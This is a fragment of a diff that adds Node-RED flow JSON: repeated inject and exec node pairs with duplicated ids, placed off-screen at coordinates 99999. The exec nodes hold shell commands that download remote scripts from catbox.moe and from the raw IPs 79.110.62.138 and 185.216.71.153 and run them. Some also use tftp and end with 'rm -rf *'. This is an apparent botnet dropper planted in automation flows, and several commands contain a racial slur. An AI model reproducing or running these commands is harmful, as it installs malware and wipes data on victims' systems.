+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/i38np0.py && python3 i38np0.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  && python3  && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/8emdeq.py && python3 8emdeq.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/hm2eyr.py && python3 hm2eyr.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/3w2sbq.py && python3 3w2sbq.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/j64fce.py && python3 j64fce.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/spx4dp.py && python3 spx4dp.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/cgblae.py && python3 cgblae.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp && curl -O http://79.110.62.138/eskgbins.sh && chmod 777 eskgbins.sh && sh eskgbins.sh && tftp 79.110.62.138 -c get eskgtftp1.sh && chmod 777 eskgtftp1.sh && sh eskgtftp1.sh && tftp -r eskgtftp2.sh -g 79.110.62.138 && chmod 777 eskgtftp2.sh && sh eskgtftp2.sh && rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh && rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp && curl -O http://79.110.62.138/eskgbins.sh && chmod 777 eskgbins.sh && sh eskgbins.sh && tftp 79.110.62.138 -c get eskgtftp1.sh && chmod 777 eskgtftp1.sh && sh eskgtftp1.sh && tftp -r eskgtftp2.sh -g 79.110.62.138 && chmod 777 eskgtftp2.sh && sh eskgtftp2.sh && rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
